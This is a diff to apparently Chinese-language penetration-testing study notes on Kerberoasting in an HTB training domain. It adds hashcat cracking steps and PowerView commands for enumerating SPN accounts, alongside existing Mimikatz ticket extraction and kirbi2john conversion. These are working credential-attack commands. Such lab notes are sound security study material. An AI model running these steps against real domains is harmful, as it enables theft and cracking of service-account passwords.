@@ -48,11 +48,14 @@ C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 
 用MimiKatz从内存提取票据
 echo "<base64 blob>" |  tr -d \\n | base64 -d > sqldev.kirbi      用哈希替换掉<base64 blob>，然后删除echo产生的最后的最后换行，转成kirbi文件
 python2.7 kirbi2john.py sqldev.kirbi      创建一个名为 crack_file 的文件
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat      处理crack_file
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
 如果跳过 Mimikatz 的 base64 输出并输入 mimikatz # kerberos::list /export，
 .kirbi 文件将会被写入磁盘，可以直接运行 kirbi2john.py，从而跳过 base64 解码步骤
 
+Windows自动化工具
+C:\htb> Import-Module .\PowerView.ps1      导入module
+C:\htb> Get-DomainUser * -spn | select samaccountname      枚举SPN账户
 
-sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat      处理crack_file
-hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
 
 
